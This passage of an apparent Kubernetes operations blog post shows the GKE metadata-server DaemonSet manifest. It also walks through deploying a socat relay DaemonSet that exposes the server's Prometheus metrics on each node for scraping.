<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">apiVersion</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">extensions/v1beta1</span>
</span><span class='line'><span class="l-Scalar-Plain">kind</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">DaemonSet</span>
</span><span class='line'><span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">labels</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">addonmanager.kubernetes.io/mode</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Reconcile</span>
</span><span class='line'>    <span class="l-Scalar-Plain">k8s-app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server</span>
</span><span class='line'>  <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server</span>
</span><span class='line'>  <span class="l-Scalar-Plain">namespace</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">kube-system</span>
</span><span class='line'><span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">revisionHistoryLimit</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">10</span>
</span><span class='line'>  <span class="l-Scalar-Plain">selector</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">matchLabels</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">k8s-app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server</span>
</span><span class='line'>  <span class="l-Scalar-Plain">template</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">annotations</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="l-Scalar-Plain">components.gke.io/component-name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server</span>
</span><span class='line'>        <span class="l-Scalar-Plain">components.gke.io/component-version</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">0.2.21</span>
</span><span class='line'>        <span class="l-Scalar-Plain">scheduler.alpha.kubernetes.io/critical-pod</span><span class="p-Indicator">:</span> <span class="s">&#39;&quot;</span><span class="se">&#39;&#39;</span><span class="s">&quot;&#39;</span>
</span><span class='line'>      <span class="l-Scalar-Plain">creationTimestamp</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">null</span>
</span><span class='line'>      <span class="l-Scalar-Plain">labels</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="l-Scalar-Plain">addonmanager.kubernetes.io/mode</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Reconcile</span>
</span><span class='line'>        <span class="l-Scalar-Plain">k8s-app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server</span>
</span><span class='line'>    <span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">containers</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">command</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">/gke-metadata-server</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">--logtostderr</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">--token-exchange-endpoint=https://securetoken.googleapis.com/v1/identitybindingtoken</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">--identity-namespace=[REDACTED]</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">--identity-provider-id=https://container.googleapis.com/v1/projects/[REDACTED]/locations/europe-west1/clusters/[REDACTED]</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">--passthrough-ksa-list=kube-system:container-watcher-pod-reader,kube-system:event-exporter-sa,kube-system:fluentd-gcp-scaler,kube-system:heapster,kube-system:kube-dns,kube-system:metadata-agent,kube-system:network-metering-agent,kube-system:securityprofile-controller,istio-system:istio-ingressgateway-service-account,istio-system:cluster-local-gateway-service-account,csm:csm-sync-agent,knative-serving:controller</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">--attributes=cluster-name=[REDACTED],cluster-uid=[REDACTED],cluster-location=europe-west1</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">--enable-identity-endpoint=true</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">--cluster-uid=[REDACTED]</span>
</span><span class='line'>        <span class="l-Scalar-Plain">image</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke.gcr.io/gke-metadata-server:20200218_1145_RC0</span>
</span><span class='line'>        <span class="l-Scalar-Plain">imagePullPolicy</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">IfNotPresent</span>
</span><span class='line'>        <span class="l-Scalar-Plain">livenessProbe</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="l-Scalar-Plain">failureThreshold</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">3</span>
</span><span class='line'>          <span class="l-Scalar-Plain">httpGet</span><span class="p-Indicator">:</span>
</span><span class='line'>            <span class="l-Scalar-Plain">host</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">127.0.0.1</span>
</span><span class='line'>            <span class="l-Scalar-Plain">path</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/healthz</span>
</span><span class='line'>            <span class="l-Scalar-Plain">port</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">54898</span>
</span><span class='line'>            <span class="l-Scalar-Plain">scheme</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">HTTP</span>
</span><span class='line'>          <span class="l-Scalar-Plain">initialDelaySeconds</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">10</span>
</span><span class='line'>          <span class="l-Scalar-Plain">periodSeconds</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">10</span>
</span><span class='line'>          <span class="l-Scalar-Plain">successThreshold</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">1</span>
</span><span class='line'>          <span class="l-Scalar-Plain">timeoutSeconds</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">1</span>
</span><span class='line'>        <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server</span>
</span><span class='line'>        <span class="l-Scalar-Plain">resources</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="l-Scalar-Plain">limits</span><span class="p-Indicator">:</span>
</span><span class='line'>            <span class="l-Scalar-Plain">cpu</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">100m</span>
</span><span class='line'>            <span class="l-Scalar-Plain">memory</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">100Mi</span>
</span><span class='line'>          <span class="l-Scalar-Plain">requests</span><span class="p-Indicator">:</span>
</span><span class='line'>            <span class="l-Scalar-Plain">cpu</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">100m</span>
</span><span class='line'>            <span class="l-Scalar-Plain">memory</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">100Mi</span>
</span><span class='line'>        <span class="l-Scalar-Plain">securityContext</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="l-Scalar-Plain">privileged</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">true</span>
</span><span class='line'>        <span class="l-Scalar-Plain">terminationMessagePath</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/dev/termination-log</span>
</span><span class='line'>        <span class="l-Scalar-Plain">terminationMessagePolicy</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">File</span>
</span><span class='line'>        <span class="l-Scalar-Plain">volumeMounts</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">mountPath</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/var/lib/kubelet/kubeconfig</span>
</span><span class='line'>          <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">kubelet-credentials</span>
</span><span class='line'>          <span class="l-Scalar-Plain">readOnly</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">true</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">mountPath</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/var/lib/kubelet/pki/</span>
</span><span class='line'>          <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">kubelet-certs</span>
</span><span class='line'>          <span class="l-Scalar-Plain">readOnly</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">true</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">mountPath</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/var/run/</span>
</span><span class='line'>          <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">container-runtime-interface</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">mountPath</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/etc/srv/kubernetes/pki</span>
</span><span class='line'>          <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">kubelet-pki</span>
</span><span class='line'>          <span class="l-Scalar-Plain">readOnly</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">true</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">mountPath</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/etc/ssl/certs/</span>
</span><span class='line'>          <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">ca-certificates</span>
</span><span class='line'>          <span class="l-Scalar-Plain">readOnly</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">true</span>
</span><span class='line'>      <span class="l-Scalar-Plain">dnsPolicy</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Default</span>
</span><span class='line'>      <span class="l-Scalar-Plain">hostNetwork</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">true</span>
</span><span class='line'>      <span class="l-Scalar-Plain">nodeSelector</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="l-Scalar-Plain">beta.kubernetes.io/os</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">linux</span>
</span><span class='line'>        <span class="l-Scalar-Plain">iam.gke.io/gke-metadata-server-enabled</span><span class="p-Indicator">:</span> <span class="s">&quot;true&quot;</span>
</span><span class='line'>      <span class="l-Scalar-Plain">priorityClassName</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">system-node-critical</span>
</span><span class='line'>      <span class="l-Scalar-Plain">restartPolicy</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Always</span>
</span><span class='line'>      <span class="l-Scalar-Plain">schedulerName</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">default-scheduler</span>
</span><span class='line'>      <span class="l-Scalar-Plain">securityContext</span><span class="p-Indicator">:</span> <span class="p-Indicator">{}</span>
</span><span class='line'>      <span class="l-Scalar-Plain">serviceAccount</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server</span>
</span><span class='line'>      <span class="l-Scalar-Plain">serviceAccountName</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server</span>
</span><span class='line'>      <span class="l-Scalar-Plain">terminationGracePeriodSeconds</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">30</span>
</span><span class='line'>      <span class="l-Scalar-Plain">tolerations</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">effect</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">NoExecute</span>
</span><span class='line'>        <span class="l-Scalar-Plain">operator</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Exists</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">effect</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">NoSchedule</span>
</span><span class='line'>        <span class="l-Scalar-Plain">operator</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Exists</span>
</span><span class='line'>      <span class="l-Scalar-Plain">volumes</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">hostPath</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="l-Scalar-Plain">path</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/var/lib/kubelet/pki/</span>
</span><span class='line'>          <span class="l-Scalar-Plain">type</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Directory</span>
</span><span class='line'>        <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">kubelet-certs</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">hostPath</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="l-Scalar-Plain">path</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/var/lib/kubelet/kubeconfig</span>
</span><span class='line'>          <span class="l-Scalar-Plain">type</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">File</span>
</span><span class='line'>        <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">kubelet-credentials</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">hostPath</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="l-Scalar-Plain">path</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/var/run/</span>
</span><span class='line'>          <span class="l-Scalar-Plain">type</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Directory</span>
</span><span class='line'>        <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">container-runtime-interface</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">hostPath</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="l-Scalar-Plain">path</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/etc/srv/kubernetes/pki/</span>
</span><span class='line'>          <span class="l-Scalar-Plain">type</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Directory</span>
</span><span class='line'>        <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">kubelet-pki</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">hostPath</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="l-Scalar-Plain">path</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/etc/ssl/certs/</span>
</span><span class='line'>          <span class="l-Scalar-Plain">type</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">Directory</span>
</span><span class='line'>        <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">ca-certificates</span>
</span><span class='line'>  <span class="l-Scalar-Plain">templateGeneration</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">7</span>
</span><span class='line'>  <span class="l-Scalar-Plain">updateStrategy</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">rollingUpdate</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">maxUnavailable</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">1</span>
</span><span class='line'>    <span class="l-Scalar-Plain">type</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">RollingUpdate</span>
</span></code></pre></td></tr></table></div></figure>


<p>We can run a separate workload on this cluster that uses <a href="https://linux.die.net/man/1/socat"><code>socat</code></a> to proxy HTTP requests to
gke-metadata-server. <code>socat</code> stands for socket cat and is a multipurpose relay. It&rsquo;s <code>netcat</code> on
steroids and can relay any kind of packets not just TCP and UDP.</p>

<p>This proxy is deployed as a DaemonSet to make it easy to have a one-to-one
correspondence with each node-local gke-metadata-server Pod. The DaemonSet will also need to have
<code>.spec.template.spec.hostNetwork: true</code> so that it can share the same network namespace.</p>

<p>Here&rsquo;s the proxy DaemonSet YAML. I use the Docker image <a href="https://hub.docker.com/r/alpine/socat/tags"><code>alpine/socat:1.7.3.4-r0</code></a> which is a
tiny 3.61MB. The arguments <code>["TCP-LISTEN:54899,reuseaddr,fork", "TCP:127.0.0.1:54898"]</code> tell socat
to forward traffic from <code>0.0.0.0:54899</code> to <code>127.0.0.1:54898</code> which is where the Prometheus metrics
are. <code>fork</code> tells socat to</p>

<blockquote><p>After establishing a connection, handles its channel in a child process and keeps the parent
process attempting to produce more connections, either by listening or by connecting in a loop</p></blockquote>

<p>&mdash; <a href="http://www.dest-unreach.org/socat/doc/socat.html#OPTION_FORK">http://www.dest-unreach.org/socat/doc/socat.html#OPTION_FORK</a></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">cat proxy-daemonset.yaml</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">apiVersion</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">apps/v1</span>
</span><span class='line'><span class="l-Scalar-Plain">kind</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">DaemonSet</span>
</span><span class='line'><span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server-metrics-proxy</span>
</span><span class='line'>  <span class="l-Scalar-Plain">namespace</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">monitoring</span>
</span><span class='line'><span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>  <span class="l-Scalar-Plain">selector</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">matchLabels</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server-metrics-proxy</span>
</span><span class='line'>  <span class="l-Scalar-Plain">template</span><span class="p-Indicator">:</span>
</span><span class='line'>    <span class="l-Scalar-Plain">metadata</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">labels</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="l-Scalar-Plain">app</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server-metrics-proxy</span>
</span><span class='line'>    <span class="l-Scalar-Plain">spec</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="l-Scalar-Plain">hostNetwork</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">true</span>
</span><span class='line'>      <span class="l-Scalar-Plain">containers</span><span class="p-Indicator">:</span>
</span><span class='line'>      <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">gke-metadata-server-metrics-proxy</span>
</span><span class='line'>        <span class="l-Scalar-Plain">image</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">alpine/socat:1.7.3.4-r0@sha256:6786951b55e321e3968ba1c3786cb79b768f85d83d438f085336442b3bcef67a</span>
</span><span class='line'>        <span class="l-Scalar-Plain">args</span><span class="p-Indicator">:</span> <span class="p-Indicator">[</span><span class="s">&quot;TCP-LISTEN:54899,reuseaddr,fork&quot;</span><span class="p-Indicator">,</span> <span class="s">&quot;TCP:127.0.0.1:54898&quot;</span><span class="p-Indicator">]</span>
</span><span class='line'>        <span class="l-Scalar-Plain">ports</span><span class="p-Indicator">:</span>
</span><span class='line'>        <span class="p-Indicator">-</span> <span class="l-Scalar-Plain">name</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">prom-metrics</span>
</span><span class='line'>          <span class="l-Scalar-Plain">containerPort</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">54899</span>
</span><span class='line'>          <span class="l-Scalar-Plain">protocol</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">TCP</span>
</span><span class='line'>        <span class="l-Scalar-Plain">livenessProbe</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="l-Scalar-Plain">httpGet</span><span class="p-Indicator">:</span>
</span><span class='line'>            <span class="l-Scalar-Plain">host</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">127.0.0.1</span>
</span><span class='line'>            <span class="l-Scalar-Plain">path</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">/metricz</span>
</span><span class='line'>            <span class="l-Scalar-Plain">port</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">54899</span>
</span><span class='line'>            <span class="l-Scalar-Plain">scheme</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">HTTP</span>
</span><span class='line'>        <span class="l-Scalar-Plain">resources</span><span class="p-Indicator">:</span>
</span><span class='line'>          <span class="l-Scalar-Plain">limits</span><span class="p-Indicator">:</span>
</span><span class='line'>            <span class="l-Scalar-Plain">cpu</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">100m</span>
</span><span class='line'>            <span class="l-Scalar-Plain">memory</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">100Mi</span>
</span><span class='line'>          <span class="l-Scalar-Plain">requests</span><span class="p-Indicator">:</span>
</span><span class='line'>            <span class="l-Scalar-Plain">cpu</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">100m</span>
</span><span class='line'>            <span class="l-Scalar-Plain">memory</span><span class="p-Indicator">:</span> <span class="l-Scalar-Plain">100Mi</span>
</span></code></pre></td></tr></table></div></figure>


<p>Apply the DaemonSet.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">kubectl --context [CONTEXT] apply -f proxy-daemonset.yaml</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now make an HTTP request to any GKE node IP at port 54899.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='yaml'><span class='line'><span class="l-Scalar-Plain">kubectl --context [CONTEXT] -n monitoring get pods --selector app=gke-metadata-server-metrics-proxy -o wide</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">NAME                                      READY   STATUS    RESTARTS   AGE     IP              NODE                             NOMINATED NODE   READINESS GATES</span>
</span><span class='line'><span class="l-Scalar-Plain">gke-metadata-server-metrics-proxy-dvlpg   1/1     Running   0          4d19h   10.200.208.6    my-cluster-n1-s-32-dfabe6b6-38px   &lt;none&gt;           &lt;none&gt;</span>
</span><span class='line'><span class="l-Scalar-Plain">gke-metadata-server-metrics-proxy-dx4lq   1/1     Running   0          4d19h   10.200.208.8    my-cluster-n1-s-32-dfabe6b6-mnlg   &lt;none&gt;           &lt;none&gt;</span>
</span><span class='line'><span class="l-Scalar-Plain">gke-metadata-server-metrics-proxy-j9p49   1/1     Running   0          4d19h   10.200.208.7    my-cluster-n1-s-32-dfabe6b6-vv9s   &lt;none&gt;           &lt;none&gt;</span>
</span><span class='line'><span class="l-Scalar-Plain">gke-metadata-server-metrics-proxy-jvvjw   1/1     Running   0          4d19h   10.200.208.12   my-cluster-n1-s-32-192fa3d9-wb2c   &lt;none&gt;           &lt;none&gt;</span>
</span><span class='line'><span class="l-Scalar-Plain">gke-metadata-server-metrics-proxy-k5sqd   1/1     Running   0          4d19h   10.200.208.10   my-cluster-n1-s-32-55dd75ff-6l40   &lt;none&gt;           &lt;none&gt;</span>
</span><span class='line'><span class="l-Scalar-Plain">gke-metadata-server-metrics-proxy-tdhkn   1/1     Running   0          4d19h   10.200.208.9    my-cluster-n1-s-32-55dd75ff-jqgk   &lt;none&gt;           &lt;none&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain">http GET &#39;10.200.208.6:54899/metricz&#39; | head -n 20</span>
</span><span class='line'>
</span><span class='line'><span class="l-Scalar-Plain"># HELP go_gc_duration_seconds A summary of the GC invocation durations.</span>
</span><span class='line'><span class="l-Scalar-Plain"># TYPE go_gc_duration_seconds summary</span>
</span><span class='line'><span class="l-Scalar-Plain">go_gc_duration_seconds{quantile=&quot;0&quot;} 2.8295e-05</span>
</span><span class='line'><span class="l-Scalar-Plain">go_gc_duration_seconds{quantile=&quot;0.25&quot;} 3.6269e-05</span>
</span><span class='line'><span class="l-Scalar-Plain">go_gc_duration_seconds{quantile=&quot;0.5&quot;} 5.2122e-05</span>
</span><span class='line'><span class="l-Scalar-Plain">go_gc_duration_seconds{quantile=&quot;0.75&quot;} 7.585e-05</span>
</span><span class='line'><span class="l-Scalar-Plain">go_gc_duration_seconds{quantile=&quot;1&quot;} 0.099987877</span>
</span><span class='line'><span class="l-Scalar-Plain">go_gc_duration_seconds_sum 7.738486774</span>
</span><span class='line'><span class="l-Scalar-Plain">go_gc_duration_seconds_count 6809</span>
</span><span class='line'><span class="l-Scalar-Plain"># HELP go_goroutines Number of goroutines that currently exist.</span>
</span><span class='line'><span class="l-Scalar-Plain"># TYPE go_goroutines gauge</span>
</span><span class='line'><span class="l-Scalar-Plain">go_goroutines 47</span>
</span><span class='line'><span class="l-Scalar-Plain"># HELP go_info Information about the Go environment.</span>
</span><span class='line'><span class="l-Scalar-Plain"># TYPE go_info gauge</span>
